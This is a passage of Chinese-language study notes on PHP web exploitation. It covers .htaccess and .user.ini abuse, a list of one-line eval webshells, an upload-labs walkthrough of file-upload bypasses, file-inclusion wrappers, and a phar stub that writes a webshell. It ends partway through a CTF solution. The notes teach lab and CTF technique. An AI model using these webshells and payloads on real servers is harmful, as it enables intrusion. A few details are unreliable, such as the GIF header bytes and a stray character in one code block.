php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。

#### 2.5 `php_flag`

`php_flag` 用来设定布尔值的 `php` 配置指令

```
php_flag name on|off
```

查看[php.ini 配置选项列表](https://www.php.net/manual/zh/ini.list.php),寻找可利用指令

![20200909005659-4f6099ac-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005659-4f6099ac-f1f4-1.png)

可以将 `engine` 设置为 0,在本目录和子目录中关闭 `php` 解析,造成**源码泄露**

```php
php_flag engine 0
```

![image-20240510195054936](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240510195054936.png)

## 3. 利用方式

#### 3.1 文件解析

经常出现在文件上传的黑名单没有限制 `.htaceess` 后缀，通过上传 `.htaccess` 文件，再上传图片，使图片的 `php` 恶意代码得以被解析执行

`.htaccess` 文件内容有如下两种：

1.`SetHandler` 指令

当然，`image.jpg`需要符合PHP语法规范

```htaccess
<FilesMatch "image.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

2.`AddType`

```htaccess
# 将 .jpg 当做 PHP 文件解析
AddHandler application/x-httpd-php .jpg
```

#### 3.2 本地文件包含

通过 `php_value` 来设置 `auto_prepend_file`或者 `auto_append_file` 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 `php` 文件来触发。

`.htaccess` 分别通过这两个配置选项来包含 `/etc/passwd`,并访问同目录下的 `index.php`文件。（需要主文件）

```htaccess
auto_prepend_file /etc/passwd
```

![image-20240510195805482](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240510195805482.png)

这里也可以做远程文件包含，但是需要在 `php.ini` 中设置 `all_url_include` 为 `On`

#### 3.3 源码泄露

利用 `php_flag` 将 `engine` 设置为 0,在本目录和子目录中关闭 `php` 解析,造成源码泄露

![image-20240510195054936](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240510195054936.png)

#### 3.4 代码执行

1.利用伪协议`all_url_fopen`、`all_url_include` 为 `On`

```htaccess
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

2.解析`.htaccess`

方法一：当访问任意`php`文件的时候，会自动执行`phpinfo()`；这里`#`代表注释符，保证`.htaccess`没有语法错误，当访问任意`php`文件时，就会将`.htaccess`文件本身包含进来，刚好注释这里符合PHP语法规范，就能成功执行

```
php_value auto_append_file .htaccess
#<?php phpinfo();
```

![20200909005923-a54f0dbc-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005923-a54f0dbc-f1f4-1-171534334394211.png)

方法二：这种适合同目录或子目录没有 `php` 文件。需要先设置允许可访问 `.htaccess` 文件

```htaccess
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
```

将 `.htaccess`指定当做 php文件处理

![20200909005943-b168631e-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005943-b168631e-f1f4-1.png)

#### 3.5 命令执行

**CGI启动**

`cgi_module` 需要加载，即 `apache` 配置文件中有

```
LoadModule cgi_module modules/mod_cgi.so
```

.htaccess内容

```
Options ExecCGI #允许CGI执行
AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析
```

ce.xx

```
#!C:/Windows/System32/cmd.exe /k start calc.exe
6
```

![20200909010005-be1b5918-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010005-be1b5918-f1f4-1-171534412677816.png)

例题可看 [De1CTF2020 check in](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in)

**FastCGI启动**

`mod_fcgid.so`需要被加载。即 `apache` 配置文件中有

```
LoadModule fcgid_module modules/mod_fcgid.so
```

.htaccess

```
Options +ExecCGI
AddHandler fcgid-script .xx
FcgidWrapper "C:/Windows/System32/cmd.exe /k start calc.exe" .xx
```

ce.xx 内容随意

![20200909010022-c87ef536-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010022-c87ef536-f1f4-1-171534415631818.png)

#### 3.6 XSS

##### 3.6.1 highlight_file

.htaccess

```
php_value highlight.comment '"><script>alert(1);</script>'
```

其中的 `highlight.comment` 也可以换成如下其他选项

![20200909010040-d2e896bc-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010040-d2e896bc-f1f4-1.png)

index.php

```
<?php
highlight_file(__FILE__);
// comment
```

![20200909010053-daf6b2d0-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010053-daf6b2d0-f1f4-1.png)

##### 3.6.2 错误消息链接

index.php ：

```
<?php
include('foo');#foo报错
```

.htaccess

```
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```

![20200909010109-e4856468-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010109-e4856468-f1f4-1.png)

#### 3.7自定义错误文件

error.php

```
<?php include('shell');#报错页面
```

.htaccess

```
php_value error_log /tmp/www/html/shell.php 
php_value include_path "<?php phpinfo(); __halt_compiler();"
```

访问 error.php，会报错并记录在 shell.php 文件中

![20200909010123-ed10a03e-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909010123-ed10a03e-f1f4-1.png)

因为会经过 html 编码，所以需要 UTF-7 来绕过。

htaccess

```
# 第一次
php_value error_log /tmp/shell #定义错误路径
#---- "<?php phpinfo(); __halt_compiler();" in UTF-7:
php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"

# 第二次
php_value include_path "/tmp" #将include()的默认路径改变
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

例题可看[X-NUCA-ezphp](https://www.cnblogs.com/tr1ple/p/11439994.html)





## `$_Files` 变量

`$_Files`变量记录了文件的相信信息，包括文件类型，文件名，上传路径等

```bash
array(5) {
  ["name"]=>
  string(14) "金砖2023.txt"
  ["type"]=>
  string(10) "text/plain"					# MIME
  ["tmp_name"]=>
  string(22) "C:\Windows\php80F6.tmp"
  ["error"]=>
  int(0)
  ["size"]=>
  int(247)
}
```

值得一提的是：`type`对应的是HTML中的`Content-Type`字段。大多数时候，后台程序员都是根据`type`的类型来判断文件类型是否合法。但是可以通过使用BP来修改`Content-Type`字段，以达到绕过的目的

现在将`.htaccess`文件上传，并将文件类型修改为图片文件。最后文件上传到服务器的文件名依然是：`.htaccrss`

==即：修改`Content-Type`不会影响文件的类型==

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230706134229696.png" alt="image-20230706134229696" style="zoom:50%;" />

## PHP一句话木马大全

```php
<?=eval($_POST['cmd']);?>
<?eval($_POST['cmd']);?>
<?php eval($_POST['cmd']);?>
<script language="php">eval($_POST['cmd']);</script>
```

## upload-labs 通过

### 第一关

前端JS校验文件后缀是否合法，拦截数据包并修改JS代码就行

### 第二关

后端校验MIME类型，MIME的来源为：`$_FILES['file']['type']`变量，而这个变量来自于HTTP的`Content-Type`字段

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230706134229696.png" alt="image-20230706134229696" style="zoom:50%;" />

### 第三关

后端黑名单过滤危险文件后缀，但没有完全过滤，PHP可执行的文件后缀如下：

```
php
php7
php5
php4
php3
php2
php1
html
htm
phtml
pht
```

我这里使用phtml成功绕过

**为什么有些地方phtml成功有些地方却要用php3、php4？**

这主要是因为apache或者nginx的配置不同，导致可执行的文件后缀不同，apache配置如下：

![image-20240420212930046](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240420212930046.png)

### 第四关

`.htaccess`可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页、文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表、以及使用其他文件作为index文件等一些功能

与`httpd.conf`配置文件的区别：

+ `.htaccess`文件的作用范围更为局部，它通常位于网站的根目录或特定目录中，并只影响该目录及其子目录，每个目录都可以有自己的`.htaccess`文件
+ `httpd.conf`文件的作用范围更为全局，它是Apace主配置文件，影响整个服务器

使用方式：`.htaccess`文件可以通过文本编辑器直接进行修改或创建，且修改会即使生效，无需重启

```
# apache 文件示例，下面两条语句都可以用（选一个即可）

# 添加可执行类型为 php .jpg .txt，与第三关修改主文件配置有的一样的性质，只是作用域不一样
AddType application/x-httpd-php .jpg .txt

# 设置当前目录所有文件都使用 PHP 解析 （推荐用这句）
SetHandler application/x-httpd-php
```

**通过过程：**先上传`.htaccess`文件，再上传一句话木马，只要将这个木马的后缀名改为`jpg`即可

### 第五关

先上传`.user.ini`，再上传`shell.jpg`即可，由于`.user.ini`的触发需要PHP引擎的启动，所以还需要访问`upload`目录下的PHP文件

```php
# .user.ini 文件内容
auto_prepend_file=shell.jpg
    
# shell.jpg 文件内容
<?php eval($_POST['cmd'])?>
```

### 第六关

大小写绕过，这里相比其他关卡少了一步将文件后缀转为小写的操作，且`in_array()`检验区分大小写，所以直接把后缀改成`.PHP`即可

```php
$file_name = $_FILES['upload_file']['name'];
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA

if (!in_array($file_ext, $deny_ext)) {
           ......
            }
```

### 第七关

后缀加空格绕过，如果文件名后面又空格或点的话，Windows会自动删除！！！

### 第八关

后缀加点绕过，如果文件名后面又空格或点的话，Windows会自动删除！！！

### 第九关

#### 前置知识：额外数据流

在Windows操作系统中，当你看到文件名后跟着`::$DATA`时，它表示文件的一个附加数据流（Alternate Data Stream,ADS），数据流是一种用于在文件内部存储额外数据流的机制

在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是，Windows NT文件系统（NTFS）支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过文件名后面添加`::$DATA`来访问

例如，`1.txt`是一个文件，而`1.txt::$DATA`是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息，标签等

需要注意的是，大多数常规的文件操作佛南方局不会意识到这些额外的数据流，而只会处理默认的数据流，要访问或操作这些附加数据流，通过需要使用特定的命令行工具或编程接口

```shell
# 创建文本文件
C:\Users\19374\Desktop\CTF>echo "Hello World" > 1.txt
# 向文本文件写入额外数据流
C:\Users\19374\Desktop\CTF>echo "Hack" >> 1.txt:hack
# 记事本查看额外数据流
C:\Users\19374\Desktop\CTF>notepad 1.txt:hack
# 查看文本文件原数据
C:\Users\19374\Desktop\CTF>type 1.txt
"Hello World"
```

由于Windows的文件名不允许有`:`，所以会自动将`::$DATA`删掉，这样额外数据流会直接被当成原数据流写入到文件中

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240421210929397.png" alt="image-20240421210929397" style="zoom:67%;" />

### 第十关

点加空格点绕过

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);			# shell.php. .
        $file_name = deldot($file_name);//删除文件名末尾的点			  # shell.php. 
        $file_ext = strrchr($file_name, '.');						# . 
        $file_ext = strtolower($file_ext); //转换为小写				 # . 
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA				
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;				# UPLOAD_PATH/shell.php
```

### 第十一关

双写绕过

```php
$file_name = str_ireplace($deny_ext,"", $file_name);
```

### 第十二关

#### 前置知识：空字符

在编程语言中，如果遇到`0x00`则表示这行代码结束了，后续的内容就不会继续读取

`0x00`的表现形式：`%00 \00`

```php
$ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        # $_GET['save_path'] 是可控的，所以直接在这里给上文件名并用 %00 截断掉 / 后面的内容
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

![image-20240421212821245](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240421212821245.png)

### 第十三关：字节标识绕过

JPEG/JFJF（常见的照片格式）：头两个字节为：`0xFF 0xD8`

GIF（支持动画的图像格式）：头两个字节为：`0x47 0x50`

BMP（Windows 位图格式）：头两个字节为：`0x42 0x4D`

TFTF（标签图像文件格式）：头两个字节可以是不同的数值

头文件的绕过一般是因为后端通过校验文件的前两个字节来确定文件类型，那么只要我们将这两个字节修改为图片的字节，后端就会认为这是一个图片

**头字节绕过文件制作**

创建文件，并写入占位符，这里是`aa`

![image-20240421215148159](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240421215148159.png)

010 打开并修改头两个字节，最后保存并上传即可

![image-20240421215407091](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240421215407091.png)

**通过方法：**在一句话木马前面加上`GIF89a`即可，再利用文件包含将这个文件`include`（`include require`函数不管文件后缀，只要文件里面的内容符合PHP语法规范就会被执行）

### 第十四关：图片马绕过

这个方法也可以用来绕过`getimagesize()`函数 

```bash
# DOS图片马制作	1.jpg 为正常图片 1.php 为一句话木马
C:\Users\19374\Desktop\CTF>copy 1.jpg/b+1.php hack.jpg
1.jpg
1.php
        1 file(s) copied.

```

生成后由于图片中自带`<??>`导致PHP直接包含的时候会报错，到时自己检测一下！！！

### 第十七关：二次渲染绕过

```php
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);
z
    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);
            ......
        }
    }
```

`imagecreatefromjpeg()`函数会将上传上来的图片重写一次，生成一个新图片，这样得到的新图片就不会包含一句话木马了

解决方法：

1. 在旧图片和新图片中会有一定的公共部分，这个公共部分是`imagecreatefromjpeg()`不会修改的，利用这一点，在公共部分插入一句话木马即可
2. 被渲染过的新图片放到`imagecreatefromjpeg()`不会再次渲染，利用这一点，传入没有木马的图片被渲染一次再将新图片另存为到本地，再插入一句话木马并上传

#### 解法一：公共部分插入一句话木马

先上传一张正常图片，并将这张图片保存到本地

![image-20240422154708501](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422154708501.png)

打开010Editer比较两张图片找出公共部分

![image-20240422154851021](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422154851021.png)

点击“匹配”找出公共部分，并在里面写入一句话木马

![image-20240422155230589](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422155230589.png)

![image-20240422155351497](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422155351497.png)

重新上传`404.gif`，并使用文件包含漏洞包含即可！！！

#### 解法二：二次渲染绕过

主要利用`imagecreatefromjpeg()`函数再经过一次渲染后再对这张渲染后的图片再次渲染不会有任何修改的特性

先上传一张正常图片，并将这张图片保存到本地

![image-20240422154708501](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422154708501.png)

在这张图片上插入一句话木马，并上传即可

### 第十八关：条件竞争

条件竞争：主要是因为服务器是先保存文件，再检验文件的合法性，假如文件不合法，再删除（说白了，就是**在文件被删除之前访问文件**）

```php
$ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }
```

首先创建一句话木马文件`shell2.php`并抓包，再`send to intruder`

```php
<?php fwrite(fopen('shell.php','w'),'<?php eval($_POST[cmd]);?>');?>
```

![image-20240422163634416](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422163634416.png)

拦截访问`shell2.php`的数据包，也`send to intruder`。

为什么这里是直接访问`shell2.php`？

看源码可以直到，服务端是先保存再重命名的，基于此，我们要做的是在重命名之前访问到木马

![image-20240422163709598](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422163709598.png)

payload 方面，全部选择`Null payloads`

![image-20240422163925894](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422163925894.png)

木马上传方面，选择默认线程10即可，但是访问木马`intruder`需要把线程拉大

![image-20240422164022782](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240422164022782.png)

发起攻击并观察访问木马的`intruder`，如果期间出现状态码为200，证明攻击成功！

### 第十九关：Apache解析漏洞+条件竞争

由于Apache环境问题，我这里的Apache没有这个解析漏洞，即在访问`1.php.7z`的时候，由于Apache不认识`7z`后缀，所以继续向前解析，由于认识`php`后缀，所以将这个文件当成`php`来解析

思路：在第十八关的基础上，将要竞争的文件名换成`shell2.php.7z`即可





# 文件包含

## 文件包含漏洞理论

### 文件包含漏洞产生原因

由于程序员的代码不规范或为了保证代码的灵活性，错误使用PHP文件包含函数，如：`include | require`函数，包含了一个**用户可控变量**，从而造成了文件包含漏洞

### 触发文件包含的PHP函数

```
Include：
Include_once：
require
require_once
highlight_file、show_source、readfile、file_get_contents、fopen、file
```

include 和 require 函数的区别：

`include` 和 `require` 都可以用来在 PHP 文件中插入另一个 PHP 文件的内容。它们的区别在于，当文件不存在时，`include` 会产生一个警告，但脚本会继续执行；而 `require` 会产生一个致命错误，并停止脚本执行

`include_once`和`require_once`若遇到重复包含的代码块，都只会包含一次

**补充：**`include`函数还可以包含图片文件或者其他文件，只要里面带有着`PHP`代码就会被执行

#### 文件包含漏洞分类

+ 本地文件包含

+ 远程文件包含

  ```
  allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件
  Allow_url_include：为ON时，就可使用include和require等方式包含远程文件
  ```

#### 文件包含漏洞利用方式

##### `PHP`伪协议

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)



```
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用
data:// 同样类似与php://input，可以让用户来控制输入流
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行
phar://xxx.png/shell.php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。
```

### 文件包含漏洞防御

+ PHP 中使用 open_basedir 配置限制访问在指定的区域
+ 过滤.（点）/（反斜杠）\（反斜杠）
+ 禁止服务器远程文件包含
+ 尽量不要使用动态包含，可以在需要包含的页面固定写好

## 文件包绕过方式

### `%00`截断

此方法要求`PHP`版本必须小于`5.3.4`，后面版本已修复

#### 源码

```php
<?php
include($_GET['library'].".php");
?>
```

#### 原理

在路径最后加入`%00`，传入`PHP`之后变成下面这样，相当于在最后添加了一个空格，让`PHP`读不到后面拼接出来的字符串

```php
<?php
include("flag.txt .php");
?>
```

补充，有时也可以使用`./`

### 路径长度绕过

## windows系统

### 1.路径长度绕过

==Windows使用256个`.`或`./`来绕过。Linux需要4096个==

**wj.php**

```javascript
<?php
$a=@$_GET['123'];
include($a.'.html');
?>
```

复制

如果限制了文件类型，比如这里只能包含html后缀的文件，那么就可以使用此方法

#### 简介

操作系统存在最大路径长度的限制。`windows系统，文件名最长256个字符`，可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名被中途截断

在文件后面加`.` 如： `info.php...........................................................................................................................................................................................................................................................................................html`

`.`超过256个就行，后面多出来的`...........................................html`不会被识别到

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1200.png)



## `PHP`伪协议

跟着这张图照着打就好

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)

`file://`：后面跟绝对路径，用于直接**读取文件**

`php://filter`：以`base64`的方式**读取文件**

`php://input`：接受POST数据，可以使用POST方法来**写入恶意代码并执行**

`zip://`：需要先上传一个带有`PHP`代码的`PHP`压缩文件（压缩文件不检验后缀名，只要是一个压缩文件就可以），然后通过访问这个压缩包里面指定的`PHP`文件以达到**执行PHP代码**的目的

### `php://filter`

注意：`read`是可选参数，在特点情况下，不带`read`参数的payload可以绕过WAF

![image-20230902155148007](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902155148007.png)

#### `php://filter`格式

```
php://filter/<filtername>/resource=<filename>
<filtername>：过滤器
<filename>：文件名
```

**注意：**过滤器是可选的，即我们可以不带过滤器的形式读取文件：`php://filter/resource=flag.php`

#### `php://filter`过滤器详解

* `convert.base64-encode 和 convert.base64-decode`

  使用这两个过滤器等同于分别用 `base64_encode()` 或 `base64_decode()` 函数处理所有的流数据。

  ```php
  # 将数据流以base64编码
  php://filter/convert.base64-encode/resource=flag.php
  # 将数据流以base64解码
  php://filter/convert.base64-decode/resource=flag.php
  ```

+ `convert.quoted-printable-encode 和 convert.quoted-printable-decode`

  使用此过滤器的 decode 版本等同于用 `quoted_printable_decode()`函数处理所有的流数据。

  ==`quoted_printable`是一种编码格式==

  ```
  php://filter/convert.quoted-printable-encode/resource=flag.php
  ```

+ `convert.iconv.*`

  在激活 `iconv` 的前提下可以使用 `convert.iconv.*` 压缩过滤器， 等同于用` iconv()`处理所有的流数据。 该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 `convert.iconv.<input-encoding>.<output-encoding>` 或 `convert.iconv.<input-encoding>/<output-encoding>` （两种写法的语义都相同）

  `icon()`函数解析：将字符串从一个字符编码转换到另一个字符编码

  **常见的编码转换格式**

  ```
  UTF-8 和 UTF-16
  UTF-8 和 ISO-8859-1
  UTF-8 和 Windows-1252
  UTF-8 和 GBK
  UTF-8 和 Big5
  ```

  **支持的编码格式**

  ![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/5a822481c9734b658c703ce0a782d502.png)![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/ee8f18d48b08440398466df437e38eae.png)

  ![img](https://img-blog.csdnimg.cn/ee8f18d48b08440398466df437e38eae.png)

```php
# 将flag.php文件从utf-8格式转换为utf-16编码
php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
# 将flag。php文件从utf-8格式转换为ASCII编码
```





直接使用`php://filter`来读取flag

```
payload：?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20230707221254364](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221254364.png)

![image-20230707221324095](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221324095.png)

### `php://input`

使用`php://input`配合POST方法做数据提交

![image-20230707221623621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221623621.png)

### `zip://`

说明：

1. `zip`访问的压缩文件不校验后缀名，只要是压缩文件就行
2. `zip`必须使用**绝对路径**来访问压缩文件
3. `zip`在路径后面使用`%23具体文件名`来访问指定文件



先上传一个压缩文件

![image-20230707224105309](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224105309.png)

使用`zip`伪协议进行访问

![image-20230707224406577](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224406577.png)

```
payload：?file=zip://E:\phpstudy\phpstudy\phpstudy_pro\WWW\lfi-labs-master\php\uploads\9dce5388f44ed37f145b3737f360f7c0.zip%23phpinfo.php
```

### `data://`

这个协议与`file`协议差不多，只不过比`file`更多的花样而已，具体可以看图

```
payload：?file=data://text/plain,<?php+phpinfo();?> 
```

![image-20230707225819389](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707225819389.png)

### `phar://`

**1. 基础使用**

phar反序列化即在文件系统函数，如`file_exists()`和`is_dir() unline()`等，在参数可控的情况下，配合`phar://`伪协议，可以不依赖`unserialize()`直接进行反序列化操作

有一个`test7.zip`的压缩包内容如下：

![image-20240220022817438](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220022817438.png)

可以直接使用`phar://`访问`test7.php`，如下：

```php
<?php
include "phar://test7.zip/test7.php";

# 输出
flag is this
```

**2. Phar文件结构**

Phar文件主要包含三至四个部分：

1）A stub

stub的基本结构：<?php **HALT_COMPILER();，stub必须以**HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。

2）a manifest describing the contents

Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点

![image-20240220023129742](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220023129742.png)

3）the file contents

被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化

4）a signature for verifying Phar integrity

签名格式
[![img](https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png)

![image-20240220023142850](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220023142850.png)

**3. phar 文件生成**

PS：`php.ini`中必须设置`phar.readonly=Off`，不然`Phar`文件就会无法生成。

将生成的phar文件上传到服务器中，再在文件包含漏洞处包含该文件就可以做到在没有`unserialize`函数的情况下触发发序列化漏洞

```php
<?php
    class Test{
        public $test="test";
    }

    @unlink("test.phar")
    $phar = new Phar("test.phar"); //后缀名必须为phar
    $phar->startBuffering();		
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub，必须以<?php __HALT_COMPILER(); ?>结尾
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest，这里的内容后续在做包含的时候会自动被反序列化
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    $phar->stopBuffering();    //签名自动计算
?>
```

`setMetadata`的内容会在创建`phar`文件的时候自动以序列化的形式写入文件中，并在被调用或包含的时候自动反序列化

![image-20240420161521490](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240420161521490.png)

**phar 冷知识**

phar 的`stub`头是可以写入一句话木马的，这个一句话木马会在解析phar文件的时候自动执行，此外，我们也可以在压缩文件处创建一句话木马

```php
<?php
class Test{
    public $test="test";
}

@unlink("test.phar");
$phar = new Phar("test.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub('<?php fputs(fopen(\'shell.php\', \'w\'), \'<?php eval($_POST["cmd21"])?>\'); __HALT_COMPILER(); ?>');
$o = new Test();
$phar->setMetadata($o); //将自定义的meta-data存入manifest，这里的内容后续在做包含的时候会自动被反序列化
$phar->addFromString("test.php", '<?php fputs(fopen(\'shell.php\', \'w\'), \'<?php eval($_POST["cmd21"])?>\');?>'); //添加要压缩的文件
$phar->stopBuffering();    //签名自动计算
?>
```

**注意：**要让setStub的代码成功生效，就只能访问到phar文件，即：`phar://test.phar`，如果访问`phar://test.phar/test.php`就不会生效



**4. [SWPUCTF 2018]SimplePHP**

首先进入，在URL上好像是可以直接访问文件的，按经验来讲，就是通过这里包含源码做分析的

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240220024059462.png" alt="image-20240220024059462" style="zoom: 67%;" />

既然如此，把能拿到的源码都拿下来，如下

**upload_file.php**

```php
<?php
include 'function.php';
upload_file();
?>
```

**file.php**

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
ini_set('open_basedir','/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if(empty($file)) {
    echo "<h2>There is no file to show!<h2/>";
}
$show = new Show();
if(file_exists($file)) {
    $show->source = $file;
    $show->_show();
} else if (!empty($file)){
    die('file doesn\'t exists.');
}
?>
```

**function.php**

```php
<?php
//show_source(__FILE__);
include "base.php";
header("Content-type: text/html;charset=utf-8");
error_reporting(0);
function upload_file_do()
{
    global $_FILES;
    $_FILES['file'] = array(
            'name' => 'shell.jpg',
            'type' => 'text/plain',
            'tmp_name' => '/tmp/php80F6.tmp',
            'error' => 0,
            'size' => 247
    );

    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
var_dump($filename);
    //mkdir("upload",0777);
    if (file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
